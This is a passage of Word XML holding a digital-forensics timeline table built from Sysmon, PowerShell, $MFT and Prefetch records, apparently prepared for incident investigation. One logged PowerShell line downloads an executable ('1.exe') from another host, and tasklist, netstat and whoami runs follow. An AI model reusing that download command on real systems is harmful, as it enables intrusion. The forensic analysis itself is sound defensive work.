              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 5848, ProcessGUID: e6e9f951-0f52-654e-ad01-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\explorer.exe | ParentProcessID: 7324, ParentProcessG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18676</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, I-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:10.219150</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>powershell</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 5848, ParentProce</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18677</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:10.400596</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A._h_Jx2Ns.20231110030910.txt</w:t>
              <w:br/>
              <w:t>size=10284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119924</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.494829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: wget http://10.0.0.12:8080/1.exe -o 1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8814</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-009, F-016, F-019, I-005, I-008, T-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-009, F-018, I-006, I-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.607209</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 11 | Microsoft-Windows-Sysmon | FileCreate | ProcessID: 736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: EXE | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | TargetFilename: C:\Users\medmondson\1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18680</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-010, I-017, T-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-009, F-013, F-016, F-019, I-003, I-012, T-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.838148</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>TASKLIST.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=2448BC7D False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TASKLIST.EXE-2448BC7D.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-007, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tasklist</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 8012, ProcessGUID: e6e9f951-0fdb-654e-ba01-000000000500 | RuleName: - | MD5=80036C62EACEEFAC7F7DF133634321F5,SHA256=9F60240830FAF4DE590360561A6E249F5D0C41FF8AFBB9498BBE5C1A80ABD02C,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 5848, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-007, T-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447441</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NETSTAT.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=34A60389 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#83</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NETSTAT.EXE-34A60389.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, T-010, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447885</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>netstat  -ntb</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6292, ProcessGUID: e6e9f951-1017-654e-c701-000000000500 | RuleName: - | MD5=2445DECE99DEEDBD701DC6DFE10E648E,SHA256=5A780D6630639FFB7FD3D295C182EAA2A7CAD2C70248C5BA8F334BB3803353CA,IMPHASH=F495C58FFEE3A623AD7AAA6BE78756D5 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 5848, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18688</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, I-009, T-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:06.409323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WinRM/Operational 145 | Microsoft-Windows-WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#24540</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-WinRM%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:22.056897</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Bits-Client/Operational 59 | Microsoft-Windows-Bits-Client | BITS transfer has started | jobTitle: UpdateBinary | jobId: f9cdb807-3ff9-4592-8e3f-da45ed8b8cce | URL: https://oneclient.sfx.ms/Win/Installers/23.214.1015.0001/amd64/OneDriveSetup.exe | Peer:  | Total Bytes: 64958880 (Transferred: 0) | Bytes Transferred from Peer: 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#7376</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Bits-Client%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.697436</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>WHOAMI.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=824687C3 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#217</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\WHOAMI.EXE-824687C3.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
